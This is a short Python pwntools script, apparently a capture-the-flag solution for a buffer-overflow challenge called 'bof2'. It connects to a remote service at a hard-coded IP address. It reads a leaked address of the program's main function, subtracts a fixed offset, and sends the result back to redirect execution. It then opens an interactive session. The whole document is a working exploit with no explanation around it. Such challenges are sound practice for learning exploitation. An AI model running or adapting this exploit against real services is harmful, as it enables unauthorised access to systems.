import pwn
#p = pwn.process("./bof2")
p = pwn.remote("34.121.178.119",13372)
p.write(b"19A")
p.recvuntil('your main ')
main = p.readline()[:14]
main = int(main.decode('utf-8'),16) - (0xe2-0x49+1)
p.write(str(main))
pwn.log.info(str(main))
p.interactive()
